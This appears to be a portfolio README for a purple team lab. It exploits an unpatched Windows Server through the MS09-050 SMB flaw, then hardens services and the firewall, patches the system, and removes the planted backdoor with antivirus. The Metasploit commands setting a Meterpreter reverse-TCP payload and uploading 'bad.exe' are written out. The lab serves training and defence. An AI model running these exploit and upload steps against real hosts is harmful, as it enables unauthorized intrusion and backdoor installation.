# 🔒 Patching, Securing Systems, and Configuring Anti-Virus
### A Full Purple Team Lab: Red Team Exploitation → Blue Team Hardening & Malware Removal

---

## 📝 Overview
This project demonstrates a complete attack-and-defense lifecycle on a Windows Server environment. Acting as both the Red Team attacker and Blue Team defender, I exploited an unpatched SMB vulnerability, delivered malware, hardened the system, applied security patches, and used antivirus tools to detect and remove the threat.

This lab showcases:
- Vulnerability discovery and enumeration
- Remote exploitation using MS09-050
- Meterpreter post-exploitation activity
- Windows service and firewall hardening
- Patch management and validation
- Malware detection and remediation
- Defense-in-depth security principles

---

## 🎯 Objectives
- Exploit an unpatched Windows Server via SMB
- Deploy malware through Meterpreter
- Patch the system to prevent future exploitation
- Harden Windows services and firewall rules
- Install antivirus and detect/remove malware
- Validate remediation by re-testing exploit failure

---

## 🖧 Lab Topology

Kali Linux (192.168.1.101) → Attacker (Red Team)  
Windows Server (192.168.1.10) → Victim / Hardening Target (Blue Team)  
Metasploitable (192.168.1.30) → Auxiliary vulnerable host  

![Lab Topology](images/R&B_Top.png)

---

# ⚔️ RED TEAM PHASE — Exploiting the Vulnerability

## 🔍 Nmap Scan of Target (192.168.1.10)
![Nmap Scan](images/nmap_192168110.png)

An Nmap scan revealed numerous exposed and legacy services including FTP, Telnet, NetBIOS, LDAP, Kerberos, and HTTP/HTTPS, confirming the system was poorly hardened and vulnerable to attack.

---

## 🚀 Launching Metasploit on Kali Linux
![Metasploit Launch](images/msf_1681101.png)

---

## 🎯 Configuring MS09-050 SMB Exploit
use exploit/windows/smb/ms09_050_smb2_negotiate_func_index  
set RHOST 192.168.1.10  
set LHOST 192.168.1.101  

![Exploit Configuration](images/set_Rhost_192.png)

---

## 💾 Setting Payload (Meterpreter Reverse TCP)
set payload windows/meterpreter/reverse_tcp  

![Payload Selection](images/payload_reversetcp.png)

---

## 💥 Exploiting the Vulnerability
The exploit succeeded and opened a Meterpreter session on the Windows Server.

![Exploit Success](images/exploit_reversetcp.png)

---

## 🦠 Uploading Malware (bad.exe)
upload bad.exe c:\  

![Malware Uploaded](images/uploaded_badexe.png)

This simulates a real-world attacker deploying a backdoor after gaining remote access.

---

# 🛡️ BLUE TEAM PHASE — Hardening & Remediation

## 🛠 Reviewing Running Services
![Services](images/services_msn_110.png)

---

## ❌ Disabling Insecure or Legacy Services

FTP Publishing Service  
![FTP Disabled](images/ftp_flushing.png)

Simple TCP/IP Services  
![TCP Services Disabled](images/TCP_IP_Services.png)

Telnet Service  
![Telnet Disabled](images/Telnet_Prop.png)

---

## 🔥 Firewall Hardening — Removing Insecure Rules

CHARGEN  
![CHARGEN Removed](images/chargen_rule.png)

DAYTIME  
![DAYTIME Removed](images/daytime_rule.png)

ECHO  
![ECHO Removed](images/echo_rule.png)

FTP Server Exception  
![FTP Exception Disabled](images/unchecked_ftp.png)

QOTD  
![QOTD Removed](images/QOTD_rule.png)

Telnet Exception  
![Telnet Exception Disabled](images/unchecked_tel.png)

---

## 🔧 Launching Firewall Configuration
firewall.cpl  

![Firewall Console](images/firewall_cpl.png)

---

# 🛠️ Patching the SMB Vulnerability (MS09-050)
The Microsoft security update KB975517 (Windows6.0-KB975517-x86.msu) was installed to remediate the SMB2 vulnerability.  
A system reboot was performed to apply the patch.

---

# 🔐 Patch Verification — Exploit Attempt Fails
![Exploit Failure](images/exploit_functionindex.png)

Exploit completed, but no session was created.

This confirms the vulnerability was successfully mitigated.

---

# 🛡️ Installing Microsoft Security Essentials
![Security Essentials Install](images/micro_security_install.png)

---

# 🚨 Malware Detection
After executing bad.exe, Microsoft Security Essentials detected:

Backdoor:Win32/Poison.E (Severe)

![Malware Detected](images/pot_unprotected.png)

The malicious file was identified as a remote access backdoor and flagged for removal.

---

# 🧠 Defense-in-Depth Demonstrated
This lab applied multiple security layers including:
- Service hardening
- Firewall rule auditing
- Patch management
- Endpoint protection
- Post-exploitation validation
- Malware detection and cleanup

---

# 🧩 Skills Demonstrated
- Vulnerability scanning and enumeration
- SMB exploitation (MS09-050)
- Meterpreter post-exploitation
- Malware deployment simulation
- Windows service and firewall hardening
- Patch management and validation
- Endpoint protection usage
- Incident response workflow
- Purple Team methodology

---

# ⭐ Why This Is Important
This project demonstrates the ability to think and operate from both offensive and defensive perspectives, reflecting real-world cybersecurity workflows.

- Hands-on security experience across the full attack lifecycle
- Strong critical thinking and structured remediation
- Understanding of attacker techniques and defensive controls
- Practical vulnerability and patch management
- Malware detection and incident response awareness
- Clear and professional technical documentation
- A true Purple Team mindset that bridges attack and defense

---

# ✅ Conclusion
This lab simulates an end-to-end cybersecurity incident.

Red Team actions included vulnerability scanning, SMB exploitation, Meterpreter access, and malware deployment.  
Blue Team actions included service hardening, firewall configuration, vulnerability patching, antivirus installation, exploit re-testing, and malware detection.

The system was successfully secured, validated, and restored, demonstrating real-world cybersecurity skills and methodology.
